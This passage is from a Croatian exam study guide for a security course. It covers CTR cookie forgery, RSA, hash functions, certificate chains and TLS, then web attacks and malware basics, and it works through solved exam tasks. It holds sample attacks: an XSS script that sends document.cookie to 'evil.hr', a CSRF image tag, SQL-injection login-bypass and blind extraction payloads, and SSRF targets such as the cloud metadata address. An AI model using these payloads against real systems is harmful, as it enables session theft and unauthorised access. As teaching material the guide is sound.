- Kolačić: c = iv || AES128-CTR-ENCRYPT(iv, p, k) = 64 bajta

**a) CTR enkripcija za p = p1 || p2 || p3:**
```
c1 = AES128(iv + 1, k) XOR p1
c2 = AES128(iv + 2, k) XOR p2
c3 = AES128(iv + 3, k) XOR p3
```

**b) CTR dekripcija za x = x1 || x2 || x3:**
```
p1 = AES128(iv + 1, k) XOR x1
p2 = AES128(iv + 2, k) XOR x2
p3 = AES128(iv + 3, k) XOR x3
```
(Potpuno isto kao enkripcija!)

**c) Napad — prijava kao 'admin' ako si korisnik 'ana':**

CTR napad je još JEDNOSTAVNIJI nego CBC:

1. Napadač se prijavi kao 'ana' → dobije kolačić: iv || x1 || x2 || x3
2. Zna da je p1 = "ana\x00...\x00" (16 bajtova, nadopunjeno nulama)
3. Zna da p1 treba postati p1' = "admin\x00...\x00"
4. Iz CTR formule: x1 = AES(iv+1, k) XOR p1, dakle keystream = x1 XOR p1
5. Novi x1': x1' = x1 XOR p1 XOR p1' = x1 XOR "ana..." XOR "admin..."
6. ALI — treba promijeniti i hash! h' = SHA256(p1') — napadač to MOŽE izračunati jer zna p1'!
7. Stari hash je h = SHA256(p1), napadač zna p1 pa zna i h
8. Novi hash h' = SHA256("admin\x00...\x00")
9. Na isti način promijeni x2 i x3: x2' = x2 XOR h_stari_prvi_dio XOR h_novi_prvi_dio, x3' = x3 XOR h_stari_drugi_dio XOR h_novi_drugi_dio
10. Pošalji: iv || x1' || x2' || x3'

**d) Je li napad moguć i preko TLS-a s HTTPOnly?**
**DA!** Napad ne zahtijeva presretanje kolačića niti XSS. Napadač je LEGITIMNI korisnik sustava — on se prijavi, dobije SVOJ kolačić, modificira ga, i pošalje natrag. TLS štiti od prisluškivanja, HTTPOnly od XSS krađe kolačića, ali napadač ima direktan pristup svom kolačiću.

### Zadatak 3 (Ispit 2021/2022 — Autentificirana šifra, 6 bodova)

**Sustav:** Za poruku m (128 bitova):
1. r = 128 slučajnih bitova
2. c = AES128(r, k) XOR m
3. t = SHA256(r || c)
4. Šifrat = (r, c, t)

**a) Postupak dešifriranja:**
1. Provjeri t = SHA256(r || c), ako nije → greška
2. m = AES128(r, k) XOR c

**b) Pruža li povjerljivost?** **DA.** Ovo je zapravo CTR s jednim blokom — r je uvijek različit (slučajan), pa je AES128(r, k) uvijek različit keystream. Efektivno OTP za jedan blok.

**c) Pruža li integritet?** **NE!** Problem: SHA256 se računa BEZ ključa! Napadač ima r i c, pa može:
1. Izračunati stari keystream: ks = AES128(r, k) — ne može direktno, ALI ako zna m...
2. Zapravo, čak i bez znanja m: napadač može promijeniti c u c' (npr. flipnuti bitove), i onda izračunati novi t' = SHA256(r || c') — jer SHA256 ne koristi ključ!
3. Pošalje (r, c', t') i server prihvati jer se hash poklapa

**Popravak:** Umjesto SHA256, koristiti **HMAC(k, r || c)** koji zahtijeva ključ.

### Zadatak 4 (Vježbe 2021 — Simetrična šifra s CTR, analiza)

**Sustav:**
1. Nadopuni m na višekratnik od 16 bajtova
2. Izračunaj SHA256(m) i dodaj na kraj
3. iv = 16 slučajnih bajtova
4. ci = AES128(iv+i, k) XOR mi
5. Šifrat = iv || c1 || c2 || ... || ck

**a) Dešifriranje:**
1. Izdvoji iv (prvih 16 bajtova)
2. mi = AES128(iv+i, k) XOR ci za svaki blok
3. Odvoji poruku i hash (zadnjih 32 bajta)
4. Provjeri SHA256(poruka) = hash

**b) Povjerljivost?** **DA** — CTR način s AES128 i slučajnim iv.

**c) Integritet?** **NE!** SHA256 se dodaje PRIJE šifriranja, ali napadač u CTR modu može flipnuti bitove u šifratu i istovremeno prilagoditi hash. Ključni problem: napadač može manipulirati šifratom u CTR modu jer je XOR operacija.

**d) Kako osigurati oba svojstva?** Koristiti **Encrypt-then-MAC**: nakon šifriranja, izračunaj HMAC(k2, iv || c) s drugim ključem k2 i dodaj na kraj.

---

# POGLAVLJE 7: RSA ⭐⭐⭐

## 7.1 Teorija

### Što je RSA?

RSA je **asimetrični kriptosustav** — koristi dva ključa:
- **Javni ključ (e, N)** — javno poznat, koristi se za šifriranje i provjeru potpisa
- **Privatni ključ (d, N)** — tajan, koristi se za dešifriranje i potpisivanje

### Kako se generiraju RSA ključevi

1. Odaberi dva velika prosta broja **p** i **q**
2. Izračunaj **N = p × q** (modul)
3. Izračunaj **φ(N) = (p-1)(q-1)** (Eulerova funkcija)
4. Odaberi **e** tako da je 1 < e < φ(N) i **gcd(e, φ(N)) = 1** (e i φ(N) su relativno prosti)
5. Izračunaj **d** tako da je **e × d ≡ 1 (mod φ(N))** (d je multiplikativni inverz od e)

### Provjera ispravnosti RSA ključeva

Par ključeva **(e, N) i (d, N)** je ispravan AKO:
1. N = p × q za neke proste p i q
2. e × d ≡ 1 (mod φ(N)), tj. (e × d) mod φ(N) = 1

**Primjer:** N = 65, e = 3, d = ?
- 65 = 5 × 13, pa φ(65) = 4 × 12 = 48
- Trebamo: 3 × d ≡ 1 (mod 48)
- 3 × 16 = 48 ≡ 0 (mod 48) — NE
- Probamo: e × d mod φ(N) = 1 → d mora zadovoljavati taj uvjet

### Tri ključne RSA formule (ZAPAMTI!)

**1. RSA Enkripcija:**
```
c = m^e mod N
```
(šifriraj javnim ključem primatelja)

**2. RSA Dekripcija:**
```
m = c^d mod N
```
(dešifriraj privatnim ključem)

**3. RSA Digitalni potpis:**
```
s = (P(H(m)))^d mod N
```
Gdje je:
- H = kriptografska hash funkcija (npr. SHA-256)
- P = funkcija nadopunjavanja (padding)
- d = privatni ključ POŠILJATELJA

**Provjera potpisa:**
```
P(H(m)) = s^e mod N
```
Ako se poklapaju → potpis je valjan.

**4. Digitalna omotnica (RSA + AES kombinirano):**
```
1. k = slučajni simetrični ključ
2. c = AES_ENCRYPT(m, k)          ← šifrirana poruka
3. ek = (P(k))^e mod N             ← šifrirani ključ (RSA-om)
4. Pošalji (c, ek)
```

### Obični RSA NIJE siguran sam po sebi!

"Obični RSA" (bez nadopunjavanja) je **deterministički** — isti m uvijek daje isti c. To znači:
- Napadač može pogađati poruke (npr. ako zna da je poruka "da" ili "ne", šifrira obje i usporedi)
- Zato se UVIJEK koristi s **nadopunjavanjem (padding)** — npr. OAEP

### Napad na RSA ako možeš faktorizirati N

Ako napadač može rastaviti N na p i q:
1. Izračunaj φ(N) = (p-1)(q-1)
2. e je poznat (iz certifikata)
3. Izračunaj d = e^(-1) mod φ(N) (multiplikativni inverz)
4. Sad imaš privatni ključ (d, N)!

## 7.2 Riješeni zadaci

### Zadatak 1 (Vježbe 2021 — Provjera RSA ključeva)
**Koji su ispravni parovi za N=65 i N=45?**

Za N=65: 65 = 5 × 13, φ(65) = 4 × 12 = 48
Za N=45: 45 = 5 × 9 — ALI 9 nije prost! 9 = 3×3. Dakle 45 = 3² × 5. Za RSA trebamo N = p×q gdje su OBA prosta. 45 NIJE valjani RSA modul!

Provjera parova:
- a) (5,65),(1,65): e=5, d=1, 5×1=5, 5 mod 48 = 5 ≠ 1 → **NE**
- b) (3,45),(11,45): N=45 nije valjani RSA modul → **NE**
- c) (3,45),(27,65): različiti N → **NE** (javni i privatni moraju imati isti N)
- d) (35,65),(11,65): e=35, gcd(35,48)? 35=5×7, 48=2⁴×3, gcd=1 ✓. 35×11=385, 385 mod 48 = 385-8×48 = 385-384 = 1 ✓ → **DA**
- e) (7,45),(13,45): N=45 nije valjani RSA modul → **NE**
- f) (3,65),(22,65): 3×22=66, 66 mod 48 = 18 ≠ 1 → **NE**
- g) (3,65),(29,65): gcd(3,48)=3 ≠ 1 — WAIT, gcd(3,48): 48=3×16, pa gcd=3 ≠ 1 → e=3 NIJE valjan za N=65! → **NE**

Hmm, zapravo: φ(65) = (5-1)(13-1) = 4×12 = 48. gcd(3, 48) = gcd(3, 48) = 3 (jer 48 = 3×16). Dakle e=3 nije relativno prost s φ(65)=48 → nijedan par s e=3 i N=65 nije valjan.

- h) (19,65),(43,65): gcd(19,48)=1 ✓. 19×43=817, 817 mod 48 = 817-17×48 = 817-816 = 1 ✓ → **DA**

**Ispravni parovi: d) i h)**

### Zadatak 2 (Ispit 2023 — RSA formule)
**a) Digitalni potpis poruke m:**
```
s = (P(H(m)))^d mod N
```

**b) RSA enkripcija poruke m:**
```
c = (P(m))^e mod N
```
(ili bez nadopunjavanja: c = m^e mod N)

**c) Digitalna omotnica:**
```
1. Generiraj slučajni simetrični ključ k
2. c = AES_ENCRYPT(m, k)
3. ek = (P(k))^e mod N
4. Šifrat = (c, ek)
```

### Zadatak 3 (Ispit 2025 — RSA enkripcija s certifikatom)
**a) Formula za šifriranje pre-master secreta m:**
```
c = m^e mod N
```
gdje su e (Exponent = 65537) i N (Modulus) iz certifikata.

**b) Kako napadač izračuna privatni ključ ako može faktorizirati N:**
1. Iz certifikata pročitaj N (Modulus) i e (Exponent = 65537)
2. Faktoriziraj N na proste faktore p i q (N = p × q)
3. Izračunaj φ(N) = (p-1)(q-1)
4. Izračunaj d = e^(-1) mod φ(N) — multiplikativni inverz od e modulo φ(N)
5. Privatni ključ je (d, N)

---

# POGLAVLJE 8: Hash funkcije ⭐⭐

## 8.1 Teorija

### Što je hash funkcija?

Hash funkcija uzima ulaz BILO KOJE veličine i vraća izlaz **fiksne veličine** (tzv. sažetak, digest, hash):
```
SHA-256("Hello")     = 185f8db3... (256 bitova = 32 bajta)
SHA-256("Hello!")     = 334d016f... (256 bitova = 32 bajta)
SHA-256(cijela knjiga) = a7f3bc21... (256 bitova = 32 bajta)
```

### Svojstva kriptografske hash funkcije

1. **Otpornost na prasliku (preimage resistance)** — Imajući hash h, praktički je nemoguće naći poruku m takvu da H(m) = h. Drugim riječima: ne možeš iz hasha izračunati izvornu poruku.

2. **Otpornost na drugu prasliku (second preimage resistance)** — Imajući poruku m1, praktički je nemoguće naći drugu poruku m2 (m2 ≠ m1) takvu da H(m1) = H(m2).

3. **Otpornost na kolizije (collision resistance)** — Praktički je nemoguće naći BILO KOJE dvije različite poruke m1 i m2 takve da H(m1) = H(m2).

**Zašto je otpornost na kolizije bitna?** Jer ako netko može naći koliziju, može zamijeniti jedan dokument drugim koji ima isti hash — npr. zamijeniti legitiman ugovor lažnim.

### Primjeri hash funkcija

| Algoritam | Izlaz | Siguran? |
|-----------|-------|----------|
| MD5 | 128 bitova | **NE** (pronađene kolizije) |
| SHA-1 | 160 bitova | **NE** (pronađene kolizije) |
| SHA-256 | 256 bitova | **DA** |
| SHA-384 | 384 bitova | **DA** |
| SHA-512 | 512 bitova | **DA** |

### SHA-1 kao identifikator

SHA-1 se još koristi kao **kratki identifikator** (npr. u certifikatima za Subject Key Identifier), jer za TU svrhu ne treba biti otporan na kolizije — samo treba biti jedinstven s velikom vjerojatnošću.

SHA-1 spada u **kriptografske hash funkcije**, a svojstvo koje treba zadovoljavati je **otpornost na drugu prasliku** (da netko ne može naći drugi ključ s istim identifikatorom).

### HMAC (Hash-based Message Authentication Code)

HMAC = hash funkcija s KLJUČEM. Koristi se za provjeru integriteta I autentičnosti.

```
HMAC(k, poruka) = hash sažetak koji OVISI o ključu
```

**Razlika od običnog hasha:**
- SHA256(poruka) — SVATKO može izračunati (nema tajnog ključa)
- HMAC(k, poruka) — samo onaj tko ima ključ k može izračunati i provjeriti

**Zato HMAC pruža integritet, a obični SHA256 NE pruža integritet!** Ovo je ključna razlika koja se pojavljuje na ispitima.

### Nonce

**Nonce** = "Number used ONCE" — jednokratni broj koji se koristi da isti ulaz ne daje isti izlaz. Sličan konceptu salt-a kod lozinki, ali u kontekstu kriptografskih protokola.

## 8.2 Riješeni zadaci

### Zadatak 1 (Ispit 2025 — SHA-1 identifikator certifikata)
**a) SHA-1 je koja vrsta algoritma?** → **Kriptografska hash funkcija**

**b) Koje sigurnosno svojstvo treba zadovoljavati?** → **Otpornost na drugu prasliku** (second preimage resistance) — da nitko ne može naći drugi ključ s istim identifikatorom.

### Zadatak 2 (Ispit 2023 — SHA256 i TOCTOU napad)
**a) Svojstvo SHA256:** → **Otpornost na kolizije** (collision resistance) — praktički nemoguće naći dvije različite poruke s istim hashom.

**b) Zašto problem kolizija koji ChatGPT identificira NIJE opasan?**
Jer SHA256 ima otpornost na kolizije — pronalaženje druge datoteke koja ima isti hash kao dopuštena datoteka zahtijeva nepraktično velike resurse (≈2^128 operacija). Dakle, napadač NE MOŽE napraviti malicioznu .exe s istim hashom.

**c) Pravi napad na ffsshd (TOCTOU — Time of Check to Time of Use):**
1. Napadač u jednoj sesiji pokrene upload legitimne datoteke (npr. notepad.exe) koja je na dopuštenoj listi
2. U drugoj paralelnoj sesiji čeka da ffsshd izračuna hash i potvrdi da je na listi
3. U trenutku IZMEĐU provjere hasha i pokretanja programa (execv), napadač u prvoj sesiji ZAMIJENI datoteku svojom malicioznom .exe
4. ffsshd pokreće datoteku misleći da je legitimna, ali sad je to maliciozna datoteka!

**d) Popravak:**
```python
def check_and_execute(exe_filename):
    # Kopiraj datoteku na sigurnu lokaciju
    safe_copy = copy_to_safe_location(exe_filename)
    # Postavi dozvole tako da nitko ne može mijenjati kopiju
    chmod(safe_copy, "read-only")
    chown(safe_copy, "root")
    # Izračunaj hash SIGURNE kopije
    exe_contents = open(safe_copy, 'rb').read()
    exe_hash = hashlib.sha256(exe_contents).hexdigest()
    if exe_hash in FAMILYLIST:
        # Pokreni SIGURNU kopiju (ne original!)
        os.execv(safe_copy)
    else:
        raise RuntimeError('Blocked by ffsshd')
```

---

# POGLAVLJE 9: PKI, certifikati i TLS ⭐⭐

## 9.1 Teorija

### Što je PKI?

**PKI** (Public Key Infrastructure) = sustav za upravljanje digitalnim certifikatima i javnim ključevima. Rješava problem: "Kako znam da javni ključ stvarno pripada osobi kojoj mislim da pripada?"

### Što je digitalni certifikat?

Certifikat je **digitalni dokument** koji povezuje identitet (npr. www.fer.unizg.hr) s javnim ključem. Certifikat izdaje i potpisuje **Certifikacijsko tijelo (CA — Certificate Authority)**.

### Struktura X.509 certifikata

```
Certificate:
    Version: 3
    Serial Number: a1:ab:98:15:...
    Signature Algorithm: sha384WithRSAEncryption    ← algoritam potpisa
    Issuer: CN = GEANT OV RSA CA 4                  ← TKO je izdao certifikat
    Validity:
        Not Before: Dec 30 2024
        Not After:  Dec 30 2025                     ← rok valjanosti
    Subject: CN = *.fer.unizg.hr                    ← ZA KOGA je certifikat
    Subject Public Key Info:
        Public-Key: (2048 bit)
        Modulus: 00:a6:05:99:...                    ← N (javni ključ - RSA modul)
        Exponent: 65537 (0x10001)                   ← e (javni ključ - eksponent)
    X509v3 extensions:
        Basic Constraints: CA:FALSE                 ← NIJE certifikacijsko tijelo
        Key Usage: Digital Signature, Key Encipherment
        Subject Alternative Name: *.fer.unizg.hr, fer.unizg.hr
    Signature Value: 5a:49:5f:cc:...                ← digitalni potpis izdavača
```

### Lanac certifikata (Certificate Chain)

Certifikati su organizirani u LANAC:
```
Korijenski CA (Root CA)        ← samopotpisan, ugrađen u preglednik
    │
    └── Posredni CA (Intermediate CA)   ← potpisan od Root CA
            │
            └── Certifikat poslužitelja    ← potpisan od Intermediate CA
```

**Provjera lanca:**
1. Preglednik ima ugrađene korijenski certifikate (Root CA) — njima VJERUJE
2. Korijenski CA je potpisao posredni CA → provjeri potpis javnim ključem Root CA
3. Posredni CA je potpisao certifikat poslužitelja → provjeri potpis javnim ključem posrednog CA

### Tko potpisuje certifikat?

**Signature Value u certifikatu** je nastala potpisom pomoću **PRIVATNOG ključa IZDAVAČA (CA)**!

Za certifikat www.fer.unizg.hr:
- Potpis je napravljen **privatnim ključem GEANT OV RSA CA 4** (izdavača)
- Potpis se PROVJERAVA **javnim ključem GEANT OV RSA CA 4**
- NE koristi se ključ poslužitelja www.fer.unizg.hr!

### Basic Constraints: CA:TRUE vs CA:FALSE

- **CA:TRUE** → ovaj certifikat SMIJE potpisivati druge certifikate (ovo je CA)
- **CA:FALSE** → ovaj certifikat NE SMIJE potpisivati druge certifikate (ovo je krajnji korisnik)

### Provjera certifikata u pregledniku

Preglednik provjerava:
1. ✅ Je li certifikat potpisan od pouzdanog CA?
2. ✅ Je li certifikat istekao? (Not After datum)
3. ✅ Poklapa li se domena u certifikatu (Subject/SAN) s domenom koju posjećuješ?
4. ✅ Je li certifikat opozvan? (CRL ili OCSP provjera)
5. ✅ Imaju li svi certifikati u lancu (osim najnižeg) CA:TRUE?
6. ✅ Imaju li svi certifikati u lancu (osim najnižeg) Key Usage: Certificate Sign?

### TLS (Transport Layer Security)

TLS štiti komunikaciju između preglednika i poslužitelja:
- **Povjerljivost** — šifrira podatke
- **Integritet** — MAC štiti od promjena
- **Autentičnost** — certifikat dokazuje identitet poslužitelja

**TLS rukovanje (handshake) — pojednostavljeno:**
1. Klijent → Server: "Želim se povezati"
2. Server → Klijent: certifikat (sadrži javni ključ)
3. Klijent provjeri certifikat
4. Klijent generira pre-master secret, šifrira ga javnim ključem servera: c = m^e mod N
5. Server dešifrira privatnim ključem: m = c^d mod N
6. Obje strane iz pre-master secreta izvedu simetrične ključeve za šifriranje komunikacije

### Lokot u pregledniku

Lokot (🔒) u pregledniku znači:
- Uspostavljena je TLS veza
- Certifikat poslužitelja je PROVJEREN i valjan
- Lokot **potvrđuje autentifikaciju poslužitelja** — DA ✓

### Anonimnost — TOR i VPN

- **TLS** NE skriva IP adresu → administrator servera i dalje vidi tvoju IP adresu
- **TOR** (The Onion Router) — usmjerava promet kroz više čvorova, skriva IP adresu → **DA, skriva IP**
- **VPN** — skriva IP od odredišnog servera, ALI VPN provider vidi tvoju pravu IP
- **TOR + VPN** — dodatni sloj zaštite → **DA**
- **Brisanje kolačića/povijesti** — NE skriva IP adresu! Samo briše lokalne tragove

## 9.2 Riješeni zadaci

### Zadatak 1 (Ispit 2025 — Potpisivanje certifikata)
**Signature Value u certifikatu www.fer.unizg.hr je nastala pomoću:**
- a) Javnog ključa www.fer.unizg.hr → **NE**
- b) Privatnog ključa www.fer.unizg.hr → **NE**
- c) Javnog ključa GEANT OV RSA CA 4 → **NE** (javni ključ se koristi za PROVJERU, ne za potpisivanje)
- d) **Privatnog ključa GEANT OV RSA CA 4** → **DA** ✓

### Zadatak 2 (Ispit 2025 — Provjera certifikata, www.fer.hr)
**Certifikat za *.fer.unizg.hr postavljen na www.fer.hr — zašto greška?**
Certifikat je izdan za domenu `*.fer.unizg.hr` i `fer.unizg.hr`. Domena `www.fer.hr` se NE poklapa s nijednom od tih domena! Preglednik provjerava poklapanje domene i odbija vezu.

### Zadatak 3 (Ispit 2025 — Anonimnost)
**Mirko želi sakriti IP od administratora FER-a:**
- a) TLS → **NE** (šifrira sadržaj, ali IP adresa je i dalje vidljiva)
- b) TOR → **DA** ✓
- c) TOR + VPN → **DA** ✓
- d) Brisanje kolačića → **NE**
- e) Brisanje povijesti → **NE**

### Zadatak 4 (Ispit 2025 — PKI napad na preglednik "Hrabri")
**Preglednik ignorira Basic Constraints i Key Usage polja.**

**a) Kako administratori FER-a mogu doći do certifikata za www.gmail.com?**
1. FER ima certifikat za *.fer.unizg.hr (CA:FALSE) i odgovarajući privatni ključ
2. Normalno ovaj certifikat NE SMIJE potpisivati druge certifikate jer je CA:FALSE
3. ALI — preglednik "Hrabri" IGNORIRA to polje!
4. Administratori koriste privatni ključ od *.fer.unizg.hr da POTPIŠU novi certifikat za www.gmail.com
5. Lanac: Root CA → GEANT → *.fer.unizg.hr → www.gmail.com
6. "Hrabri" provjerava potpise (svi valjani!) ali NE provjerava CA:FALSE → prihvaća!

**b) MITM napad na Gmail:**
1. Administratori kontroliraju mrežu FER-a
2. Kad student pokuša pristupiti www.gmail.com, presretnu zahtjev (DNS spoofing ili proxy)
3. Administratori uspostave TLS vezu sa studentom koristeći LAŽNI certifikat za www.gmail.com
4. Preglednik "Hrabri" prihvati certifikat jer ne provjerava CA polje
5. Istovremeno, administratori uspostave svoju TLS vezu s pravim Gmail-om
6. Administratori su sada "čovjek u sredini" (MITM) — vide sav promet studenta s Gmailom

---

# POGLAVLJE 10: Web sigurnost ⭐⭐

## 10.1 Teorija

### Politika istog izvorišta (Same-Origin Policy — SOP)

SOP je sigurnosni mehanizam u preglednicima koji sprječava da skripta s jednog web sjedišta pristupi podacima drugog sjedišta.

**"Izvorište" (origin)** je definirano s TRI stvari:
1. **Protokol** (http ili https)
2. **Domena** (npr. fer.hr)
3. **Port** (npr. :443)

Primjer: `https://fer.hr:443` i `https://fer.hr:8080` su RAZLIČITA izvorišta (različiti portovi)!

### XSS (Cross-Site Scripting)

XSS = napadač umetne zloćudnu JavaScript skriptu u web stranicu koju drugi korisnici posjećuju.

**Dvije vrste XSS-a:**

1. **Pohranjeni (Stored) XSS** — skripta je POHRANJENA na poslužitelju (npr. u bazi podataka, forumu). Svaki korisnik koji posjeti stranicu automatski pokreće skriptu. NE zahtijeva da korisnik klikne na link!

2. **Reflektirani (Reflected) XSS** — skripta je dio URL-a ili zahtjeva. Korisnik MORA kliknuti na malicioznu poveznicu. Skripta se "odbija" od servera natrag korisniku.

**Primjer XSS napada:**
```html
<script>document.location.href='https://evil.hr/steal?cookie='+document.cookie</script>
```
Ova skripta preusmjerava korisnika na evil.hr i šalje mu kolačiće sa TRENUTNOG sjedišta (ne s evil.hr!).

**Važno za ispit:**
- XSS skripta može pristupiti kolačićima **samo trenutnog sjedišta** (SOP!)
- Ako je na testni-forum.hr postavljen XSS koji šalje kolačiće na fer.hr, kolačić koji se šalje je kolačić s **testni-forum.hr** (ne s fer.hr)!
- **HTTPOnly** zastavica na kolačiću sprječava JavaScript pristup → XSS ne može ukrasti kolačić

### CSRF (Cross-Site Request Forgery)

CSRF = napadač prevari korisnikov preglednik da izvrši akciju na drugom sjedištu u ime korisnika.

Primjer: Korisnik je prijavljen na banku. Otvori stranicu napadača koja sadrži:
```html
<img src="https://banka.hr/transfer?to=napadac&amount=1000">
```
Preglednik automatski pošalje zahtjev banci s korisnikovim kolačićima!

**Obrana:** CSRF tokeni — tajna vrijednost u formi koju napadač ne može predvidjeti.

### SQL Injection

SQL injection = napadač umetne SQL kod kroz korisničke unose koji se direktno kopiraju u SQL upit.

**Primjer ranjivog koda:**
```sql
SELECT username FROM users WHERE username = '$u' AND code = '$c';
```
Ako napadač postavi `$u = zeljko' --`, upit postaje:
```sql
SELECT username FROM users WHERE username = 'zeljko' --' AND code = 'bla';
```
`--` je komentar → sve iza se ignorira → provjera koda je zaobiđena!

**Tehnike SQL injection-a:**

1. **Komentiranje ostatka upita:** `' --`
2. **OR uvjet:** `' OR '1'='1` → uvijek istinito
3. **UNION napad:** za dohvaćanje podataka iz drugih tablica
4. **Blind SQL injection:** saznavanje podataka znak-po-znak koristeći LIKE operator

**Obrane od SQL injection-a:**
- **Pripremljene izjave (Prepared Statements)** ← NAJBOLJA OBRANA
- **Sanitizacija (escaping) posebnih znakova** (navodnici, itd.)
- **Ograničavanje ovlasti DB korisnika**
- Sanitizacija `<script>` oznaka NE pomaže jer to je obrana od XSS-a, ne SQL injection-a!

### SSRF (Server-Side Request Forgery)

SSRF = napadač prevari POSLUŽITELJ da izvrši HTTP zahtjev na adresu po napadačevom izboru.

Primjer: Web aplikacija koja preuzima metapodatke s prijavljenih sjedišta. Napadač umjesto legitimnog URL-a može prijaviti:
- `http://localhost:8080/admin` → pristup internim servisima
- `http://169.254.169.254/metadata` → pristup cloud metapodacima (AWS, GCP)
- `http://192.168.1.1` → pristup internoj mreži

**Zašto je opasno?** Jer poslužitelj ima pristup INTERNOJ MREŽI koji vanjski korisnik nema!

### Web sigurnost — kratka pitanja

| Tvrdnja | Odgovor |
|---------|---------|
| Imena domena mogu sadržavati hrvatske dijakritičke znakove | **DA** (IDN/Punycode) |
| HTTP nema mogućnost autentifikacije | **NE** (ima Basic Auth, itd.) |
| U SOP-u, izvorište = domena + port | **NE** (treba i protokol!) |
| HTTPOnly zastavica znači da se kolačići šalju samo preko HTTPS-a | **NE** (to je Secure flag; HTTPOnly sprječava JS pristup) |
| CSRF tokeni otežavaju CSRF napad | **DA** |
| .htaccess može zabraniti izlistavanje direktorija | **DA** |
| Pohranjeni XSS zahtijeva klik na link | **NE** (to je reflektirani XSS) |
| Lokot potvrđuje autentifikaciju poslužitelja | **DA** |

## 10.2 Riješeni zadaci

### Zadatak 1 (Ispit 2025 — XSS napad)
**Na testni-forum.hr postavljen XSS:**
```html
<script>document.location.href='https://fer.hr/cookie=?'+document.cookie</script>
```
**Što se dogodi?**
- a) admin testni-forum.hr vidi kolačić s fer.hr → **NE** (SOP — skripta na testni-forum.hr nema pristup kolačićima fer.hr)
- b) admin fer.hr vidi kolačić s testni-forum.hr → **DA** ✓ (skripta čita document.cookie s testni-forum.hr i šalje ga na fer.hr u URL parametru)
- c) kolačić nije vidljiv jer HTTPS šifrira → **NE** (šifriranje štiti od prisluškivanja na mreži, ne od XSS-a)

### Zadatak 2 (Ispit 2025 — SQL Injection, brava)
**Sustav:**
```sql
SELECT username FROM users WHERE username = '$u' AND code = '$c';
```
Brava se otključa ako upit vrati redak sa sadržajem $u.

**a) Otvoriti bravu za korisnika 'zeljko' bez znanja koda:**
```
username = zeljko
code = ' OR '1'='1' --
```
Upit postaje:
```sql
SELECT username FROM users WHERE username = 'zeljko' AND code = '' OR '1'='1' --';
```
Budući da AND ima veći prioritet od OR:
- `username='zeljko' AND code=''` → false
- `'1'='1'` → true
- false OR true → true → vraća SVE retke

ALI problem: upit mora vratiti redak čiji je sadržaj 'zeljko'. Bolje rješenje:
```
username = zeljko' --
code = bilo_sto
```
Upit:
```sql
SELECT username FROM users WHERE username = 'zeljko' --' AND code = 'bilo_sto';
```
Dio `AND code = ...` je zakomentiran! Upit postaje samo provjera username-a → vraća 'zeljko' → brava se otvara!

**b) Saznati 4-znamenkasti kod u manje od 100 zahtjeva:**
Koristiti **blind SQL injection** s LIKE operatorom:

1. Pogodi prvu znamenku: šalji redom `code LIKE '0%'`, `code LIKE '1%'`, ... `code LIKE '9%'`
```
username = zeljko' AND code LIKE '0%' --
code = bilo_sto
```
Upit: `SELECT username FROM users WHERE username = 'zeljko' AND code LIKE '0%' --'...`
Ako brava odgovori "Code for 'zeljko' accepted!" → prva znamenka je 0.
Inače probaj sljedeću. Maksimalno 10 pokušaja za prvu znamenku.

2. Ponovi za drugu, treću i četvrtu znamenku: `LIKE '3__%'`, `LIKE '31_%'`, `LIKE '312_'`

Ukupno: 4 × 10 = **40 zahtjeva** (najgori slučaj) << 100 ✓

### Zadatak 3 (Ispit 2025 — SQL injection obrane)
- a) Sanitizacija navodnika → **DA** ✓
- b) Ograničavanje na samo čitanje → **DA** ✓ (brava samo čita iz baze)
- c) Sanitizacija `<script>` → **NE** (to je za XSS, ne za SQL injection)
- d) Pripremljene izjave → **DA** ✓

### Zadatak 4 (Ispit 2025 — SSRF)
**WWW.HR katalog kontaktira prijavljeno sjedište da preuzme metapodatke.**
**Zašto je ranjiv na SSRF?**

Napadač može prijaviti INTERNU adresu umjesto javnog sjedišta, npr:
- `http://localhost/admin` — pristup administratorskom sučelju WWW.HR-a
- `http://192.168.x.x/...` — pristup internim servisima u mreži WWW.HR-a
- `http://169.254.169.254/...` — pristup cloud metapodacima

Poslužitelj WWW.HR-a će izvršiti zahtjev s VLASTITE mreže, čime napadač dobiva pristup resursima koji nisu dostupni izvana. SSRF napadač zloupotrebljava poslužitelj kao proxy za pristup internoj mreži.

### Zadatak 5 (Ispit 2025 — Web sigurnost kratka pitanja)
- a) Imena domena mogu sadržavati dijakritičke znakove → **DA**
- b) HTTP nema autentifikaciju → **NE** (ima Basic/Digest auth)
- c) SOP izvorište = domena + port → **NE** (treba i protokol — trostruka kombinacija!)
- d) HTTPOnly = kolačići samo preko HTTPS → **NE** (HTTPOnly sprječava JS pristup; za HTTPS je Secure flag)
- e) Tokeni otežavaju CSRF → **DA**
- f) .htaccess zabranjuje izlistavanje → **DA**
- g) Pohranjeni XSS zahtijeva klik na link → **NE** (to je REFLEKTIRANI XSS)
- h) Lokot potvrđuje autentifikaciju poslužitelja → **DA**

---

# POGLAVLJE 11: Zloćudni kod (Malware) ⭐

## 11.1 Teorija

### Vrste zloćudnog koda po načinu širenja

| Vrsta | Kako se širi | Primjer |
|-------|-------------|---------|
| **Virus** | Prikvači se na legitimni program; širi se kad korisnik pokrene zaraženu datoteku | Macro virusi u Word dokumentima |
| **Crv (Worm)** | Širi se SAMOSTALNO mrežom, BEZ interakcije korisnika | WannaCry ransomware |
| **Trojanac (Trojan)** | Maskira se kao koristan/legitiman program; korisnik ga SAM instalira | Lažni antivirus |

### Ključna razlika: Crv vs. Trojanac vs. Virus

- **Crv**: širi se SAM, AUTOMATSKI, mrežom
- **Trojanac**: IZGLEDA kao nešto korisno, korisnik ga sam pokreće
- **Virus**: prikvači se na drugi program, širi se preko zaraženih datoteka

### Vrste zloćudnog koda po zloćudnom teretu (payload)

- **Ransomware** — šifrira datoteke i traži otkupninu
- **Spyware** — špijunira korisnika (keylogger, snimanje ekrana)
- **RAT (Remote Access Trojan)** — daje napadaču udaljeni pristup računalu
- **Botnet** — zaraženo računalo postaje dio mreže koju napadač kontrolira

### C&C (Command and Control) poslužitelj

Zloćudni kod često komunicira s **C&C poslužiteljem** — to je računalo koje napadač kontrolira i preko kojeg šalje naredbe zaraženim računalima.

Tipičan obrazac:
1. Zloćudni kod zarazi računalo
2. Periodički kontaktira C&C poslužitelj (npr. svakih 10 minuta)
3. Dobije naredbe (npr. PowerShell skriptu) i izvrši ih

## 11.2 Riješeni zadaci

### Zadatak 1 (Ispit 2023 — Guloader i NetWire-RAT)

**Scenarij:** Mirko šalje Word dokument → VB skripta preuzima Guloader.exe → Guloader preuzima NetWire-RAT.exe → RAT kontaktira 185.163.47.168

**a) Je li Guloader.exe crv?**
